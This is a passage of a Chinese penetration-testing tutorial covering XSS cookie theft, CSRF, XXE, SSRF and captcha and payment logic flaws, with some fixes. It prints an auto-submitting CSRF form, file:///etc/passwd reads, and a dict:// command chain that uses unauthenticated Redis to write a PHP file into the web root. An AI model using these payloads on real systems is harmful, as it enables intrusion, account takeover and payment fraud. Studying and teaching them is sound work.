+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564399_64a572af470e04aeb374c.jpg!small?1688564399447)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                     后台数据页面
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>逆向思维，如果后台管理员能够看到登录时所使用的信息，其效果和留言板类似，所以可以利用 XSS 漏洞盗取管理员的 Cookie。 本地搭建 Cookie 接收平台，这里使用的是从 github 上下载的模板。创建的 XSS 模板如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564425_64a572c94650d3e8af28a.jpg!small?1688564425520)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                       创建的 XSS 模版
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>在 “我的 JS” 中，选择想要的模板，写入攻击者的 IP 地址，这里的 IP 地址是被攻击者能够访问到的。最后保存环境，点击生成 payload，然后弹出攻击链接。 生成 XSS 的 payload 如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564440_64a572d8cbd40e902c2c8.jpg!small?1688564441042)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                               生成 XSS 的 payload
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>在留言板中写入恶意 JavaScript 地址，提交后，等待管理员访问。 插入 XSS 的 payload 如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564457_64a572e97ad5e8f50a760.jpg!small?1688564457758)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                   插入 XSS 的 payload
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>当管理员访问后，Cookie 接收平台便能接收到带有 Cookie 的邮件，通过 Cookie 添加工具添加 Cookie，访问后台地址，成功登录。 Cookie 登录成功如图 4-93 所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564473_64a572f91faa1584e4de2.jpg!small?1688564473276)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                    Cookie 登录成功
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>## 7 CSRF 跨站请求伪造
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 7.1 漏洞简介
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>CSRF 跨站请求伪造漏洞指的是，攻击者盗用了他人的身份，以个人的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，如以个人的名义发送邮件、消息，盗取你的账号，添加系统管理员，甚至购买商品、虚拟货币转账等，这里可以类比成语：借刀杀人，在 CSRF 中，这把 “刀” 就是被攻击者的 Cookie 信息，用被攻击者的 Cookie 来发起攻击。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 7.2 漏洞利用
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 7.2.1 GET 型 CSRF
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>如果一个网站某个地方的功能，如用户修改邮箱是通过 GET 请求进行修改的，如：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;/user.php?id=1&amp;email=123@163.com&lt;/pre&gt;
+</span></span><span style=display:flex><span>这个链接的意思是用户 ID=1 将邮箱修改为 [123@163.com](mailto:123@163.com)。当攻击者把这个链接修改为：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;/user.php?id=1&amp;email=abc@163.com&lt;/pre&gt;
+</span></span><span style=display:flex><span>然后通过各种手段发送给被攻击者，诱使被攻击者点击此链接，当用户刚好在访问这个网站，并且点击了这个链接，那么悲剧就发生了。这个用户的邮箱被修改为 [abc@163.com](mailto:abc@163.com)。 这就是一个经典的 GET 型 CSRF 攻击的过程，可以看到 CSRF 攻击需要管理员参与进来，所以诱骗和钓鱼是必不可少的步骤。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 7.2.2 POST 型 CSRF
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>POST 型 CSRF 攻击要稍微烦琐一些，需要攻击者自己构造表单信息：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;&lt;form action=/coures/user/handler/25332/buy method=POST&gt;
+</span></span><span style=display:flex><span>&lt;input type=&#34;text&#34;  /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;&lt;/pre&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>假设上述是一个恶意的表单提交操作，可以将这个表单保存为 html 后缀的文件，然后上传到服务器上，当管理员访问到这个 html 文件的时候就会自动触发表单操作，这就是 POST 型 CSRF 的攻击流程。 POST 型 CSRF 攻击的难点在于表单的构造，实际渗透测试的时候可以使用 Burpsuite 直接生成，在抓包的时候，点击鼠标右键，可以直接生成一个 CSRF 的表单，这个时候只需要将这个表单发给被攻击者，然后被攻击者去访问触发即可。构造 CSRF 表单如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564490_64a5730a5cd72215dd8f9.jpg!small?1688564491039)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                      构造 CSRF 表单
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>又因为 Burpsuite 生成的表单默认是有提交按钮的，所以被攻击者必须点击这个按钮才可以触发构造好的表单内容，这一点是钓鱼攻击的发起者不希望的，所以攻击者需要二次修改表单，让攻击的过程更加顺利，在表单当中添加如下代码：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;
+</span></span><span style=display:flex><span>这表示当访问到这个页面的时候会自动触发表单，大大提高了 CSRF 的成功概率。 CSRF 表单效果如下图所示
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564507_64a5731bcab3b51a110e7.jpg!small?1688564507848)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                 CSRF 表单效果
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 7.3 漏洞实战
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>由于 CSRF 常见于论坛功能模块，攻击者可利用一个简单的留言平台来模拟实现 CSRF 攻击，构造表单。action 指向的是用户注册页面。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;&lt;html&gt;
+</span></span><span style=display:flex><span>&lt;body&gt;
+</span></span><span style=display:flex><span>&lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;        
+</span></span><span style=display:flex><span>&lt;form action=&#34;http://10.20.24.244:83/?user-create.htm&#34; method=&#34;POST&#34;&gt; &lt;input type=&#34;hidden&#34;  /&gt;          
+</span></span><span style=display:flex><span>&lt;input type=&#34;hidden&#34;  /&gt;          
+</span></span><span style=display:flex><span>&lt;input type=&#34;submit&#34; value=&#34;Submit request&#34; /&gt;        
+</span></span><span style=display:flex><span>&lt;/form&gt;     
+</span></span><span style=display:flex><span>&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;      
+</span></span><span style=display:flex><span>&lt;/body&gt;   
+</span></span><span style=display:flex><span>&lt;/html&gt;&lt;/pre&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>插入 CSRF 表单如下图
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564524_64a5732c4a00c49c01ddc.jpg!small?1688564524463)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                  插入 CSRF 表单
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>主题发表成功，结果如下。 发表带表单链接的主题如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564539_64a5733bc8ce15c7efe08.jpg!small?1688564539852)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>模拟登录管理员账号，转到 test 用户发表的链接。 模拟用户点击链接如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564552_64a5734883d2cb950abd4.jpg!small?1688564552619)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                     模拟用户点击链接
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>返回成功，实现 CSRF 钓鱼攻击，结果如下。 CSRF 攻击成功如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564567_64a57357776bd82475bb8.jpg!small?1688564567570)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                              CSRF 攻击成功
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>在 admin 的后台发现该用户已经被注册成功。 用户被成功注册如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564582_64a5736612afca4e24e77.jpg!small?1688564582119)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                                 用户被成功注册
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>## 8 XXE XML 实体注入
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 8.1 漏洞简介
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>XXE 注入攻击也称 XML 外部实体注入攻击，当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。 通常攻击者会将 payload 注入 XML 文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口的请求，换言之，XXE 是一种从本地到达各种服务的方法，和 SSRF 具有类似的表现形式。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 8.2 漏洞实战
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>XXE 一般可能存在于用户登录模块，尝试用下面实例进行 XXE 攻击。打开一个简单的登录页面，如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564601_64a57379850df50c8449d.jpg!small?1688564601609)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                               简单的登录页面
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>使用 burpsuite 进行抓包，发现数据发送格式是 XML 文本。 抓取数据包如下图
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564618_64a5738a2b8d3658f19f0.jpg!small?1688564618804)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                                    抓取数据包
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>尝试利用 XML 模版注入读取 / etc/passwd 文件，最终成功读取文件内容。 读取 / etc/passwd 文件如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564633_64a57399f007060b878c8.jpg!small?1688564634327)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                     读取 / etc/passwd 文件
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>## 9 SSRF 服务端请求伪造
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 9.1 漏洞简介
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>SSRF（Server-Side Request Forgery）服务器端请求伪造是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。 SSRF 形成的原因是，由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如，从指定 URL 地址获取网页文本内容，加载指定地址的图片、下载文件等。 利用 SSRF 漏洞可以用于攻击内网主机，如内网扫描、内网主机端口扫描等，也可以用于窃取信息，获取内网其他主机上的数据文件等。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 9.2 漏洞利用
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 9.2.1 SSRF 的危害
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>获取出口 IP 利用站长工具的查询 IP 功能，可以让百度翻译访问站长之家，然后获取百度翻译的出口 IP。 查看百度出口 IP 如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564653_64a573ad3a91553ff7573.jpg!small?1688564655768)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                         查看百度出口 IP
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>获取本地文件信息 可以直接配合 FILE 协议进行本地信息的获取。FILE 协议读取 / etc/passwd 如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564667_64a573bb30e44cba4777a.jpg!small?1688564667502)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                            FILE 协议读取 / etc/passwd
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>获取内网 Web 资产信息 如果知道内网 Web 资产信息，可以尝试直接使用 HTTP 协议请求内容的 Web 资产。 HTTP 协议读取源代码如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564681_64a573c906dcf1968d44d.jpg!small?1688564681313)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                          HTTP 协议读取源代码
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>探测内网端口信息 这里的端口是有限制的，必须带 Banner 回显才可以探测出来。 探测目标 Web 端口信息，DICT 协议探测端口如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564697_64a573d9e22e2f299c0af.jpg!small?1688564697993)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                           DICT 协议探测端口
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>探测目标 FTP 端口信息，DICT 协议探测 FTP 服务端口如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564719_64a573efc275c9ff5c88b.jpg!small?1688564719998)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                 DICT 协议探测 FTP 服务端口
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>探测目标 SSH 端口信息，DICT 协议探测 SSH 服务端口如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564732_64a573fc6c13c5824f0a6.jpg!small?1688564732481)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                   DICT 协议探测 SSH 服务端口
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>探测目标 MySQL 端口信息，DICT 协议探测 MySQL 服务端口如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564751_64a5740f3cc3490d65c06.jpg!small?1688564751277)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                  DICT 协议探测 MySQL 服务端口
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 9.2.2 SSRF 的相关协议
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>1.FILE 协议 FILE 本地文件传输协议，主要用于访问本地计算机中的文件。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;ﬁle:///path/&lt;/pre&gt;
+</span></span><span style=display:flex><span>2.HTTP 协议 HTTP 超文本传输协议，是基于 TCP/IP 的用于传输超媒体文档应用层的一种协议。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;http://serverip:port/&lt;/pre&gt;
+</span></span><span style=display:flex><span>3.DICT 协议 DICT 字典服务器协议，是基于查询响应的 TCP 协议。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;dict://serverip:port/data&lt;/pre&gt;
+</span></span><span style=display:flex><span>4.Gopher 协议 Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议，不过目前已经慢慢淡出历史。因为 Gopher 协议支持多行，所以可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;/pre&gt;
+</span></span><span style=display:flex><span>### 9.3 漏洞实战
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>目标网站存在发起请求的功能，这个功能很可能存在 SSRF 漏洞。 存在 SSRF 漏洞的页面如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564784_64a57430084b7cd4e9e01.jpg!small?1688564784201)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                    存在 SSRF 漏洞的页面
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>尝试使用 FILE 协议读取本地的 / etc/passwd 文件：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;ﬁle:///etc/passwd&lt;/pre&gt;
+</span></span><span style=display:flex><span>成功读取到本地的 / etc/passwd 文件。 FILE 协议读取 / etc/passwd 如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564805_64a5744599fed8b4e9dc9.jpg!small?1688564806155)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                     FILE 协议读取 / etc/passwd
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>尝试使用 DICT 协议探测常见的端口，DICT 协议探测常用端口如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564876_64a5748cda154a5a4b7cc.jpg!small?1688564877044)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                             DICT 协议探测常用端口
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>发现 6379 端口是开启的，试验带入 info 尝试能否成功执行。 获取 redis 的 info 信息如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564900_64a574a4f34362510264c.jpg!small?1688564901304)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                   获取 redis 的 info 信息
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>成功执行后，接下来尝试直接使用 DICT 协议来配合 redis 未授权访问漏洞 getshell：
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>&lt;pre&gt;url=dict://127.0.0.1:6379/ﬂushall
+</span></span><span style=display:flex><span>url=dict://127.0.0.1:6379/conﬁg set dir/var/www/html/url=dict://127.0.0.1:6379/conﬁg set dbﬁlename info.php
+</span></span><span style=display:flex><span>url=dict://127.0.0.1:6379/set x &#39;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&#39;
+</span></span><span style=display:flex><span>url=dict://127.0.0.1:6379/save&lt;/pre&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>图 4-115 为通过 ssrf 来 getshell，结果成功 getshell。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564924_64a574bc52d379abc4d1b.jpg!small?1688564925004)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                          通过 ssrf 来 getshell
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>## 10 业务逻辑漏洞
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 10.1 验证码安全
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>验证码的作用是防止攻击者进行暴力破解，如常见的验证码用来防止机器批量注册、机器批量发帖回复等，为了防止用户利用机器人自动注册、登录、灌水等，大部分网站都采用了验证码技术。随着很多重要业务往 Web 上迁移，现在很多关键的敏感操作也是需要验证码来进行认证的，验证码安全性也逐渐被重视。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.1.1 验证码过于简单
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>验证码就是每次访问页面时随机生成的字符串或图片，内容一般包含数字和字母，也有可能是字符或中文，验证码的形式多种多样，需要访问者正确识别并提交，才会触发表单认证机制，这样就有效地防止了暴力破解。但是有时候往往过于简单，很容易被验证码识别引擎或者接口识别出来，进而导致攻击者依然可以正常使用机器进行批量操作。 以乌云的一篇文章为例子，白帽子发现网站登录的验证码非常简单。 带验证码的登录模块如下图所示
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564949_64a574d540ade8e631906.jpg!small?1688564949358)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                               带验证码的登录模块
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>使用一些简单的验证码识别工具可以很轻松地识别出对应的验证码，识别率可高达 99%，最后成功破解了几个账号，尝试登录到目标系统
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>通过爆破获取账号如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564967_64a574e72b70516df4b0f.jpg!small?1688564967271)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                  通过爆破获取账号
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>这类安全漏洞实际上是程序员开发的时候没有考虑到会有恶意用户来识别验证码并实施爆破，加固方法也比较简单，就是提高验证码的复杂度。提高验证码的复杂度有很多方法，常见的有字体扭曲、背景色干扰、字体粘连、背景字母干扰、字体镂空、公式验证码、字体混用、加减法验证码、主题干扰线、逻辑验证码等。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.1.2 数字暴力破解
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>平时注册账号、修改验证码、安全认证登录等方面都需要用到验证码，很多系统为了让用户体验度更佳，只设置了 4 位数字的验证码。这种 4 位数字的验证码在方便用户的同时，也带来了安全风险，如攻击者发现 4 位数字的验证码，第一反应可能就会思考这个验证码是否可以进行暴力破解。 在 2015 年左右，验证码刚刚推广普及时很多厂商的验证码都是 4 位数字，这个时候攻击者可以使用 Burpsuite 来爆破验证码，从 0000～9999 这个范围内开启多线程爆破，5 分钟左右都是可以顺利爆破成功的。下图为暴力破解验证码。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688564985_64a574f947a1aa254e588.jpg!small?1688564985671)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                  暴力破解验证码
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>上图就是早期微信任意用户密码修改漏洞的一个例子，攻击者成功地重置了对方的微信密码。 这种情况下加固也比较简单，开发者设计短信验证码的时候尽量用 6 位数字，并且设置验证码失效时间，也可以尝试增加验证码输错次数限制，增加黑客攻击难度。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.1.3 验证码不失效
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>大多数验证码的生命周期是这样的：用户访问验证码页面或者接口→生成 Code 并保存到 Session 中→用户提交验证代码→用户提交的值和服务器的值做对比，但是在某些情况下，黑客可以不访问验证码接口，直接提交之前的旧验证码就可以绕过。 下面是一个常见的登录窗口，除要输入用户名和密码外，还需要用户输入正确的验证码，当验证码输入错误时会提示验证码输入错误。 验证码输入错误页面如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565003_64a5750b867f51f9eea28.jpg!small?1688565003927)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                        验证码输入错误页面
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>但是经过渗透测试，这个登录处存在 SQL 注入漏洞，使用 SQLMap 可以直接注入测试，其中需要注意一个小细节，就是使用 Burpsuite 抓取登录的数据包时这个包不要放掉，不然验证码会失效，导致注入失败。如果放掉了，需要去网页上看新的验证码然后再手动修改之前验证码参数的值。 最后，将这个抓取到的数据包放到 SQLMap 中便可以正常进行 SQL 注入测试。本登录功能出现的逻辑问题就是验证码没有失效，只要攻击者不再次请求验证码的接口，使用旧的验证码依然可以正常进行登录验证。要想修复这种问题，应该在代码处添加如下功能：验证码生成使用过 1 次后就立即失效，而不是根据用户是否发起新的验证码请求来决定验证是否失效。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.1.4 验证码直接返回
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>开发者不严谨，导致抓包可以看到验证码在回显的 HTTP 响应包中显示，由于验证码能直接返回，因此可以通过该漏洞注册任意用户、重置已注册用户密码、修改绑定信息等高危操作，对用户造成一定影响。 早期很多 Web 应用还不成熟的时候容易出现这种问题，到后来 Android 开发刚刚流行的时候也容易见到这一类问题，在返回包中验证码可以直接看到。 抓包获取验证码如图下所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565022_64a5751ede8f424223679.jpg!small?1688565023420)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                     抓包获取验证码
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>验证码放在客户端中直接返回，说明是把网站的验证功能放在了客户端来进行校验，攻击者只需要进行简单的抓包就可以知道正确的验证码应该是什么，所以就直接突破了验证码的认证功能。类似的很多经典的安全漏洞都是由于过分信任客户端操作而产生的。正确的加固方法应该是在代码后端来校验验证码是否正确，而不是这样直接在响应包中返回。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.1.5 验证码首次绕过
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>很多网站为了方便用户，设置了第一次登录无须验证码，当用户第一次输入失败的时候，才需要输入验证码。但判断用户是否第一次登录的依据是什么呢？很多开发者并没有搞清楚，因此造成了验证码 “绕过” 问题。 有一部分开发者通过 Session 信息来判断是否启用验证码，但攻击者可以每次访问前都清掉 Session，这样就造成绕过验证码漏洞。 下面这个系统就是这样一种情况，第一次输入无须验证码，但是第二次只输入用户名和密码的时候就提示需要输入验证码。抓取登录页面的数据包如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565046_64a575362176cf848c85f.jpg!small?1688565046491)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                  抓取登录页面的数据包
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>既然第一次不需要输入验证码，是不是能让服务器觉得每次提交都是第一次呢？围绕这个目标，经过多次推理和测试，终于发现判断是否显示验证码的规则是通过服务器的 Session 信息来判断的，所以每次提交的时候顺便修改掉 Cookie 中的 PHPSESSID 的值就可以成功绕过验证码的限制了。 更改 PHPSESSID 值绕过如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565069_64a5754d8db5a0ccbb823.jpg!small?1688565070049)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                 更改 PHPSESSID 值绕过
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Session 是基于 Cookie 来保持会话的，每次提交数据的时候都更改 Sessionid，这样服务器在判断 Session 信息时，就不知道前台提交的是多次提交过的数据，也就不需要验证码来验证了。 在开发类似功能的时候，不要使用单一维度来界定，应使用多维度来判断，比如用户的 IP 地址、登录的用户名、操作的频率次数等多方面因素，多重判定防止 “绕过攻击”。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>### 10.2 支付漏洞
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>随着移动支付的普及，越来越多的人习惯在网上购物，大量的电商网站也都可以用在线支付完成交易。而在线充值必然涉及在线支付的流程，这里面存在很多逻辑问题。由于涉及金钱，如果设计不当，很有可能会产生诸如 0 元购买商品之类的严重漏洞。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>#### 10.2.1 金额数据直接修改
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>一些购物网站在支付时使用前端传过来的金额，并且没有对金额进行验证，导致金额数据篡改的产生，而正常的操作应该是在后端计算订单金额。 在购买或充值的位置做测试，如对提交订单的请求进行抓包，如果里面有金额字段，就修改金额等字段，如在支付页面抓取请求中商品的金额字段，修改成任意数额的金额并提交，查看能否以修改后的金额数据完成业务流程。 攻击者在购买商品的时候直接修改提交数据包中的价格，修改数据包如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565094_64a57566ad4b4f31c39d7.jpg!small?1688565095151)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                                修改数据包
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>接着可以直接修改掉最后付款的总价，订单金额被修改的例子如下图所示。
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>![](https://image.3001.net/images/20230705/1688565119_64a5757fcd0b745115e2b.jpg!small?1688565120073)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                                                                            订单金额被修改的例子
